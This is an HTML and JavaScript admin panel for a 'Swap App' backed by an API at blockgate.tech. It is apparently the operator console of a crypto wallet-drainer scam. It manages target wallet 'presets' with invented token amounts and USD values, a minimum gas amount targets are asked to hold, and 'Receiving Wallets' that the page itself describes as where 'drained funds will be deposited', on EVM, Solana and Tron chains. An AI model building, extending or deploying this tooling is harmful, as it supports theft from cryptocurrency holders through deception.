<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Swap App - Admin Panel</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
      color: #e2e8f0;
      min-height: 100vh;
      padding: 20px;
    }
    
    .container {
      max-width: 1200px;
      margin: 0 auto;
    }
    
    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 0;
      border-bottom: 1px solid #334155;
      margin-bottom: 30px;
    }
    
    .logo {
      font-size: 24px;
      font-weight: 700;
      background: linear-gradient(90deg, #6366f1, #8b5cf6);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    
    .api-status {
      padding: 8px 16px;
      border-radius: 20px;
      font-size: 14px;
      font-weight: 500;
    }
    
    .api-status.connected {
      background: #065f46;
      color: #34d399;
    }
    
    .api-status.disconnected {
      background: #7f1d1d;
      color: #f87171;
    }
    
    .tabs {
      display: flex;
      gap: 10px;
      margin-bottom: 30px;
      flex-wrap: wrap;
    }
    
    .tab {
      padding: 12px 24px;
      background: #1e293b;
      border: 1px solid #334155;
      border-radius: 12px;
      color: #94a3b8;
      cursor: pointer;
      font-weight: 500;
      transition: all 0.2s;
    }
    
    .tab:hover {
      background: #334155;
      color: #e2e8f0;
    }
    
    .tab.active {
      background: linear-gradient(90deg, #6366f1, #8b5cf6);
      color: white;
      border-color: transparent;
    }
    
    .card {
      background: #1e293b;
      border-radius: 16px;
      padding: 24px;
      margin-bottom: 20px;
      border: 1px solid #334155;
    }
    
    .card-title {
      font-size: 18px;
      font-weight: 600;
      margin-bottom: 20px;
      color: white;
    }
    
    .form-group {
      margin-bottom: 20px;
    }
    
    .form-group label {
      display: block;
      margin-bottom: 8px;
      font-weight: 500;
      color: #cbd5e1;
    }
    
    .form-group input,
    .form-group select {
      width: 100%;
      padding: 12px 16px;
      background: #0f172a;
      border: 1px solid #475569;
      border-radius: 10px;
      color: white;
      font-size: 14px;
      transition: border-color 0.2s;
    }
    
    .form-group input:focus,
    .form-group select:focus {
      outline: none;
      border-color: #6366f1;
    }
    
    .form-row {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 20px;
    }
    
    .btn {
      padding: 12px 24px;
      border-radius: 10px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
      border: none;
      font-size: 14px;
    }
    
    .btn-primary {
      background: linear-gradient(90deg, #6366f1, #8b5cf6);
      color: white;
    }
    
    .btn-primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(99, 102, 241, 0.4);
    }
    
    .btn-danger {
      background: #dc2626;
      color: white;
    }
    
    .btn-danger:hover {
      background: #b91c1c;
    }
    
    .btn-secondary {
      background: #475569;
      color: white;
    }
    
    .table-container {
      overflow-x: auto;
    }
    
    table {
      width: 100%;
      border-collapse: collapse;
    }
    
    th, td {
      padding: 12px;
      text-align: left;
      border-bottom: 1px solid #334155;
    }
    
    th {
      color: #94a3b8;
      font-weight: 500;
      font-size: 13px;
      text-transform: uppercase;
    }
    
    td {
      color: #e2e8f0;
    }
    
    .wallet-address {
      font-family: monospace;
      font-size: 13px;
      background: #0f172a;
      padding: 4px 8px;
      border-radius: 6px;
    }
    
    .token-logo-preview {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      object-fit: cover;
      background: #334155;
    }
    
    .status-badge {
      padding: 4px 12px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 500;
    }
    
    .status-pending {
      background: #854d0e;
      color: #fef08a;
    }
    
    .status-completed {
      background: #065f46;
      color: #34d399;
    }
    
    .actions {
      display: flex;
      gap: 8px;
    }
    
    .action-btn {
      padding: 6px 12px;
      border-radius: 6px;
      font-size: 12px;
      cursor: pointer;
      border: none;
    }
    
    .action-btn.edit {
      background: #2563eb;
      color: white;
    }
    
    .action-btn.delete {
      background: #dc2626;
      color: white;
    }
    
    /* Cloudinary Upload */
    .upload-area {
      border: 2px dashed #475569;
      border-radius: 12px;
      padding: 40px;
      text-align: center;
      cursor: pointer;
      transition: all 0.2s;
      background: #0f172a;
    }
    
    .upload-area:hover {
      border-color: #6366f1;
      background: #1e293b;
    }
    
    .upload-area.dragover {
      border-color: #6366f1;
      background: rgba(99, 102, 241, 0.1);
    }
    
    .upload-icon {
      font-size: 48px;
      margin-bottom: 16px;
    }
    
    .upload-text {
      color: #94a3b8;
      margin-bottom: 8px;
    }
    
    .upload-hint {
      color: #64748b;
      font-size: 12px;
    }
    
    .uploaded-image {
      display: flex;
      align-items: center;
      gap: 16px;
      padding: 16px;
      background: #0f172a;
      border-radius: 12px;
      margin-top: 16px;
    }
    
    .uploaded-image img {
      width: 60px;
      height: 60px;
      border-radius: 50%;
      object-fit: cover;
    }
    
    .uploaded-image-info {
      flex: 1;
    }
    
    .uploaded-image-url {
      font-size: 12px;
      color: #64748b;
      word-break: break-all;
    }
    
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.8);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      padding: 20px;
    }
    
    .modal-overlay.active {
      display: flex;
    }
    
    .modal {
      background: #1e293b;
      border-radius: 16px;
      padding: 24px;
      width: 100%;
      max-width: 500px;
      max-height: 90vh;
      overflow-y: auto;
    }
    
    .modal-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 24px;
    }
    
    .modal-title {
      font-size: 20px;
      font-weight: 600;
    }
    
    .modal-close {
      background: none;
      border: none;
      color: #94a3b8;
      font-size: 24px;
      cursor: pointer;
    }
    
    .toast {
      position: fixed;
      bottom: 20px;
      right: 20px;
      padding: 16px 24px;
      border-radius: 10px;
      color: white;
      font-weight: 500;
      transform: translateY(100px);
      opacity: 0;
      transition: all 0.3s;
      z-index: 1001;
    }
    
    .toast.show {
      transform: translateY(0);
      opacity: 1;
    }
    
    .toast.success {
      background: #065f46;
    }
    
    .toast.error {
      background: #7f1d1d;
    }
    
    .loading {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 2px solid #fff;
      border-radius: 50%;
      border-top-color: transparent;
      animation: spin 1s linear infinite;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    .hidden {
      display: none;
    }
    
    @media (max-width: 768px) {
      .form-row {
        grid-template-columns: 1fr;
      }
      
      .tabs {
        flex-direction: column;
      }
      
      .tab {
        text-align: center;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <div class="logo">Swap|App Admin</div>
      <div class="api-status disconnected" id="apiStatus">‚ö™ Checking API...</div>
    </header>
    
    <div class="tabs">
      <div class="tab active" data-tab="wallets">üìã Wallet Presets</div>
      <div class="tab" data-tab="settings">‚öôÔ∏è Gas Settings</div>
      <div class="tab" data-tab="receiving">üí∞ Receiving Wallets</div>
    </div>
    
    <!-- Wallet Presets Tab -->
    <div id="wallets-tab" class="tab-content">
      <div class="card">
        <div class="card-title">Add New Wallet Preset</div>
        <form id="addWalletForm">
          <div class="form-row">
            <div class="form-group">
              <label>Wallet Address</label>
              <input type="text" id="walletAddress" placeholder="0x..." required>
            </div>
            <div class="form-group">
              <label>Token Name</label>
              <input type="text" id="tokenName" placeholder="e.g. VDAO" required>
            </div>
          </div>
          <div class="form-row">
            <div class="form-group">
              <label>Token Symbol</label>
              <input type="text" id="tokenSymbol" placeholder="e.g. VDAO">
            </div>
            <div class="form-group">
              <label>Token Amount</label>
              <input type="number" id="tokenAmount" placeholder="e.g. 20000" required>
            </div>
          </div>
          <div class="form-row">
            <div class="form-group">
              <label>USD Value</label>
              <input type="number" id="usdValue" placeholder="e.g. 5000" required>
            </div>
            <div class="form-group">
              <label>Token Decimals</label>
              <input type="number" id="tokenDecimals" value="18">
            </div>
          </div>
          
          <!-- Cloudinary Upload Section -->
          <div class="form-group">
            <label>Token Logo (Upload via Cloudinary)</label>
            <div class="upload-area" id="uploadArea">
              <div class="upload-icon">üì§</div>
              <div class="upload-text">Click to upload or drag & drop</div>
              <div class="upload-hint">PNG, JPG, SVG (max 5MB)</div>
            </div>
            <input type="file" id="logoFile" accept="image/*" style="display: none;">
            <div class="uploaded-image hidden" id="uploadedImage">
              <img id="previewImg" src="" alt="Token Logo">
              <div class="uploaded-image-info">
                <div>Logo uploaded successfully!</div>
                <div class="uploaded-image-url" id="imageUrl"></div>
              </div>
              <button type="button" class="action-btn delete" onclick="removeImage()">‚úï</button>
            </div>
            <input type="hidden" id="tokenLogo" value="">
          </div>
          
          <button type="submit" class="btn btn-primary">‚ûï Add Wallet Preset</button>
        </form>
      </div>
      
      <div class="card">
        <div class="card-title">Whitelisted Wallets</div>
        <div class="table-container">
          <table>
            <thead>
              <tr>
                <th>Logo</th>
                <th>Wallet Address</th>
                <th>Token</th>
                <th>Amount</th>
                <th>USD Value</th>
                <th>Status</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody id="walletsTable">
              <tr>
                <td colspan="7" style="text-align: center; color: #64748b;">Loading...</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
    
    <!-- Gas Settings Tab -->
    <div id="settings-tab" class="tab-content hidden">
      <div class="card">
        <div class="card-title">Gas Requirement Settings</div>
        <form id="gasSettingsForm">
          <div class="form-row">
            <div class="form-group">
              <label>Minimum Gas Amount</label>
              <input type="number" id="gasAmount" step="0.001" placeholder="0.05" required>
            </div>
            <div class="form-group">
              <label>Gas Currency</label>
              <select id="gasCurrency" required>
                <option value="ETH">ETH (Ethereum)</option>
                <option value="BNB">BNB (BSC)</option>
              </select>
            </div>
          </div>
          <button type="submit" class="btn btn-primary">üíæ Save Gas Settings</button>
        </form>
      </div>
    </div>
    
    <!-- Receiving Wallets Tab -->
    <div id="receiving-tab" class="tab-content hidden">
      <div class="card">
        <div class="card-title">Receiving Wallet Addresses</div>
        <p style="color: #94a3b8; margin-bottom: 20px;">These are the wallets where drained funds will be deposited.</p>
        <form id="receivingWalletsForm">
          <div class="form-group">
            <label>EVM Wallet (ETH/BNB/Base)</label>
            <input type="text" id="evmWallet" placeholder="0x...">
          </div>
          <div class="form-group">
            <label>Solana Wallet</label>
            <input type="text" id="solanaWallet" placeholder="...">
          </div>
          <div class="form-group">
            <label>Tron Wallet</label>
            <input type="text" id="tronWallet" placeholder="T...">
          </div>
          <button type="submit" class="btn btn-primary">üíæ Save Receiving Wallets</button>
        </form>
      </div>
    </div>
  </div>
  
  <!-- Edit Modal -->
  <div class="modal-overlay" id="editModal">
    <div class="modal">
      <div class="modal-header">
        <div class="modal-title">Edit Wallet Preset</div>
        <button class="modal-close" onclick="closeEditModal()">√ó</button>
      </div>
      <form id="editWalletForm">
        <input type="hidden" id="editWalletId">
        <div class="form-group">
          <label>Wallet Address</label>
          <input type="text" id="editWalletAddress" readonly style="opacity: 0.6;">
        </div>
        <div class="form-row">
          <div class="form-group">
            <label>Token Name</label>
            <input type="text" id="editTokenName" required>
          </div>
          <div class="form-group">
            <label>Token Amount</label>
            <input type="number" id="editTokenAmount" required>
          </div>
        </div>
        <div class="form-row">
          <div class="form-group">
            <label>USD Value</label>
            <input type="number" id="editUsdValue" required>
          </div>
          <div class="form-group">
            <label>Token Logo URL</label>
            <input type="text" id="editTokenLogo">
          </div>
        </div>
        <div class="form-group">
          <label>Swap Status</label>
          <select id="editSwapStatus">
            <option value="false">Pending (Not Completed)</option>
            <option value="true">Completed</option>
          </select>
        </div>
        <div style="display: flex; gap: 10px;">
          <button type="submit" class="btn btn-primary">Save Changes</button>
          <button type="button" class="btn btn-secondary" onclick="closeEditModal()">Cancel</button>
        </div>
      </form>
    </div>
  </div>
  
  <!-- Toast Notification -->
  <div class="toast" id="toast"></div>

  <script>
    // Configuration
    const API_BASE_URL = 'https://blockgate.tech/api';
    
    // Cloudinary Configuration
    const CLOUDINARY_CLOUD_NAME = 'YOUR_CLOUD_NAME'; // Replace with your Cloudinary cloud name
    const CLOUDINARY_UPLOAD_PRESET = 'YOUR_UPLOAD_PRESET'; // Replace with your upload preset
    
    // DOM Elements
    const tabs = document.querySelectorAll('.tab');
    const uploadArea = document.getElementById('uploadArea');
    const logoFile = document.getElementById('logoFile');
    const uploadedImage = document.getElementById('uploadedImage');
    const previewImg = document.getElementById('previewImg');
    const imageUrlEl = document.getElementById('imageUrl');
    const tokenLogoInput = document.getElementById('tokenLogo');
    
    // Tab switching
    tabs.forEach(tab => {
      tab.addEventListener('click', () => {
        tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        
        document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden'));
        document.getElementById(`${tab.dataset.tab}-tab`).classList.remove('hidden');
      });
    });
    
    // Cloudinary Upload
    uploadArea.addEventListener('click', () => logoFile.click());
    
    uploadArea.addEventListener('dragover', (e) => {
      e.preventDefault();
      uploadArea.classList.add('dragover');
    });
    
    uploadArea.addEventListener('dragleave', () => {
      uploadArea.classList.remove('dragover');
    });
    
    uploadArea.addEventListener('drop', (e) => {
      e.preventDefault();
      uploadArea.classList.remove('dragover');
      const file = e.dataTransfer.files[0];
      if (file) uploadToCloudinary(file);
    });
    
    logoFile.addEventListener('change', (e) => {
      const file = e.target.files[0];
      if (file) uploadToCloudinary(file);
    });
    
    async function uploadToCloudinary(file) {
      if (CLOUDINARY_CLOUD_NAME === 'YOUR_CLOUD_NAME') {
        showToast('Please configure Cloudinary credentials in admin-panel/index.html', 'error');
        return;
      }
      
      uploadArea.innerHTML = '<div class="loading"></div><div class="upload-text">Uploading...</div>';
      
      const formData = new FormData();
      formData.append('file', file);
      formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
      
      try {
        const response = await fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/image/upload`, {
          method: 'POST',
          body: formData
        });
        
        const data = await response.json();
        
        if (data.secure_url) {
          tokenLogoInput.value = data.secure_url;
          previewImg.src = data.secure_url;
          imageUrlEl.textContent = data.secure_url;
          uploadArea.classList.add('hidden');
          uploadedImage.classList.remove('hidden');
          showToast('Image uploaded successfully!', 'success');
        } else {
          throw new Error('Upload failed');
        }
      } catch (error) {
        console.error('Upload error:', error);
        showToast('Failed to upload image. Please try again.', 'error');
        resetUploadArea();
      }
    }
    
    function removeImage() {
      tokenLogoInput.value = '';
      previewImg.src = '';
      imageUrlEl.textContent = '';
      uploadedImage.classList.add('hidden');
      resetUploadArea();
    }
    
    function resetUploadArea() {
      uploadArea.classList.remove('hidden');
      uploadArea.innerHTML = `
        <div class="upload-icon">üì§</div>
        <div class="upload-text">Click to upload or drag & drop</div>
        <div class="upload-hint">PNG, JPG, SVG (max 5MB)</div>
      `;
    }
    
    // API Functions
    async function checkApiStatus() {
      const statusEl = document.getElementById('apiStatus');
      try {
        const response = await fetch(`${API_BASE_URL}/admin-settings`);
        if (response.ok) {
          statusEl.textContent = 'üü¢ API Connected';
          statusEl.classList.remove('disconnected');
          statusEl.classList.add('connected');
          return true;
        }
      } catch (error) {
        console.error('API check failed:', error);
      }
      statusEl.textContent = 'üî¥ API Disconnected';
      statusEl.classList.remove('connected');
      statusEl.classList.add('disconnected');
      return false;
    }
    
    async function loadWallets() {
      try {
        const response = await fetch(`${API_BASE_URL}/wallet-presets`);
        const wallets = await response.json();
        
        const tbody = document.getElementById('walletsTable');
        
        if (wallets.length === 0) {
          tbody.innerHTML = '<tr><td colspan="7" style="text-align: center; color: #64748b;">No wallet presets found</td></tr>';
          return;
        }
        
        tbody.innerHTML = wallets.map(wallet => `
          <tr>
            <td><img src="${wallet.token?.logo || ''}" class="token-logo-preview" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><circle cx=%2220%22 cy=%2220%22 r=%2220%22 fill=%22%23334155%22/></svg>'"></td>
            <td><span class="wallet-address">${wallet.walletAddress?.substring(0, 10)}...${wallet.walletAddress?.slice(-6)}</span></td>
            <td>${wallet.token?.name || 'N/A'}</td>
            <td>${wallet.token?.amount?.toLocaleString() || 0}</td>
            <td>$${wallet.token?.usdValue?.toLocaleString() || 0}</td>
            <td><span class="status-badge ${wallet.swapCompleted ? 'status-completed' : 'status-pending'}">${wallet.swapCompleted ? 'Completed' : 'Pending'}</span></td>
            <td>
              <div class="actions">
                <button class="action-btn edit" onclick="editWallet('${wallet.walletAddress}')">Edit</button>
                <button class="action-btn delete" onclick="deleteWallet('${wallet.walletAddress}')">Delete</button>
              </div>
            </td>
          </tr>
        `).join('');
      } catch (error) {
        console.error('Failed to load wallets:', error);
        showToast('Failed to load wallets', 'error');
      }
    }
    
    async function loadSettings() {
      try {
        const response = await fetch(`${API_BASE_URL}/admin-settings`);
        const settings = await response.json();
        
        document.getElementById('gasAmount').value = settings.gasRequirement?.amount || 0.05;
        document.getElementById('gasCurrency').value = settings.gasRequirement?.currency || 'ETH';
        document.getElementById('evmWallet').value = settings.receivingWallets?.evm || '';
        document.getElementById('solanaWallet').value = settings.receivingWallets?.solana || '';
        document.getElementById('tronWallet').value = settings.receivingWallets?.tron || '';
      } catch (error) {
        console.error('Failed to load settings:', error);
      }
    }
    
    // Form Submissions
    document.getElementById('addWalletForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const data = {
        walletAddress: document.getElementById('walletAddress').value.toLowerCase(),
        token: {
          name: document.getElementById('tokenName').value,
          symbol: document.getElementById('tokenSymbol').value || document.getElementById('tokenName').value,
          amount: parseFloat(document.getElementById('tokenAmount').value),
          usdValue: parseFloat(document.getElementById('usdValue').value),
          logo: document.getElementById('tokenLogo').value,
          decimals: parseInt(document.getElementById('tokenDecimals').value) || 18
        }
      };
      
      try {
        const response = await fetch(`${API_BASE_URL}/wallet-presets`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });
        
        if (response.ok) {
          showToast('Wallet preset added successfully!', 'success');
          e.target.reset();
          removeImage();
          loadWallets();
        } else {
          throw new Error('Failed to add wallet');
        }
      } catch (error) {
        console.error('Error:', error);
        showToast('Failed to add wallet preset', 'error');
      }
    });
    
    document.getElementById('gasSettingsForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const data = {
        gasRequirement: {
          amount: parseFloat(document.getElementById('gasAmount').value),
          currency: document.getElementById('gasCurrency').value
        }
      };
      
      try {
        const response = await fetch(`${API_BASE_URL}/admin-settings`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });
        
        if (response.ok) {
          showToast('Gas settings saved successfully!', 'success');
        } else {
          throw new Error('Failed to save settings');
        }
      } catch (error) {
        console.error('Error:', error);
        showToast('Failed to save gas settings', 'error');
      }
    });
    
    document.getElementById('receivingWalletsForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const data = {
        receivingWallets: {
          evm: document.getElementById('evmWallet').value,
          solana: document.getElementById('solanaWallet').value,
          tron: document.getElementById('tronWallet').value
        }
      };
      
      try {
        const response = await fetch(`${API_BASE_URL}/admin-settings`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });
        
        if (response.ok) {
          showToast('Receiving wallets saved successfully!', 'success');
        } else {
          throw new Error('Failed to save wallets');
        }
      } catch (error) {
        console.error('Error:', error);
        showToast('Failed to save receiving wallets', 'error');
      }
    });
    
    // Edit and Delete functions
    async function editWallet(address) {
      try {
        const response = await fetch(`${API_BASE_URL}/wallet-presets/${address}`);
        const wallet = await response.json();
        
        document.getElementById('editWalletId').value = wallet.walletAddress;
        document.getElementById('editWalletAddress').value = wallet.walletAddress;
        document.getElementById('editTokenName').value = wallet.token?.name || '';
        document.getElementById('editTokenAmount').value = wallet.token?.amount || '';
        document.getElementById('editUsdValue').value = wallet.token?.usdValue || '';
        document.getElementById('editTokenLogo').value = wallet.token?.logo || '';
        document.getElementById('editSwapStatus').value = wallet.swapCompleted ? 'true' : 'false';
        
        document.getElementById('editModal').classList.add('active');
      } catch (error) {
        console.error('Error loading wallet:', error);
        showToast('Failed to load wallet data', 'error');
      }
    }
    
    document.getElementById('editWalletForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const address = document.getElementById('editWalletId').value;
      const data = {
        token: {
          name: document.getElementById('editTokenName').value,
          amount: parseFloat(document.getElementById('editTokenAmount').value),
          usdValue: parseFloat(document.getElementById('editUsdValue').value),
          logo: document.getElementById('editTokenLogo').value
        },
        swapCompleted: document.getElementById('editSwapStatus').value === 'true'
      };
      
      try {
        const response = await fetch(`${API_BASE_URL}/wallet-presets/${address}`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });
        
        if (response.ok) {
          showToast('Wallet updated successfully!', 'success');
          closeEditModal();
          loadWallets();
        } else {
          throw new Error('Failed to update wallet');
        }
      } catch (error) {
        console.error('Error:', error);
        showToast('Failed to update wallet', 'error');
      }
    });
    
    async function deleteWallet(address) {
      if (!confirm('Are you sure you want to delete this wallet preset?')) return;
      
      try {
        const response = await fetch(`${API_BASE_URL}/wallet-presets/${address}`, {
          method: 'DELETE'
        });
        
        if (response.ok) {
          showToast('Wallet deleted successfully!', 'success');
          loadWallets();
        } else {
          throw new Error('Failed to delete wallet');
        }
      } catch (error) {
        console.error('Error:', error);
        showToast('Failed to delete wallet', 'error');
      }
    }
    
    function closeEditModal() {
      document.getElementById('editModal').classList.remove('active');
    }
    
    // Toast Notification
    function showToast(message, type = 'success') {
      const toast = document.getElementById('toast');
      toast.textContent = message;
      toast.className = `toast ${type} show`;
      setTimeout(() => toast.classList.remove('show'), 3000);
    }
    
    // Initialize
    document.addEventListener('DOMContentLoaded', () => {
      checkApiStatus();
      loadWallets();
      loadSettings();
    });
  </script>
</body>
</html>
